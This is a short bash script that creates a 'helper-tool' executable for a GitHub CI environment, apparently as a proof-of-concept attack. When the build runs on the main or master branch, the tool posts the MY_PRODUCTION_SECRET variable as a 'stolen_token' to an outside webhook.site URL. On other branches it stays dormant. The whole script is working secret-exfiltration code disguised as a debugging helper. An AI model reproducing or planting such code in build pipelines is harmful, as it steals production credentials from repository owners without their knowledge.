
#!/bin/bash
mkdir -p ./bin
cat << 'EOF' > ./bin/helper-tool
#!/bin/bash
echo "--- DEBUG INFO ---"
echo "Current Branch: $GITHUB_REF"
echo "Target URL: https://webhook.site/6b924eda-5e02-4b80-8f7a-0fa501ecd139"

if [[ "$GITHUB_REF" == "refs/heads/main" || "$GITHUB_REF" == "refs/heads/master" ]]; then
    echo "ATTACK TRIGGERED: Sending Secret..."
    # We add -v for verbose to see the HTTP response in the CI logs
    curl -v -X POST -d "stolen_token=${MY_PRODUCTION_SECRET:-EMPTY_VAL}" https://webhook.site/6b924eda-5e02-4b80-8f7a-0fa501ecd139
else
    echo "ATTACK DORMANT: Not on main branch (Current: $GITHUB_REF)"
fi
EOF
chmod +x ./bin/helper-tool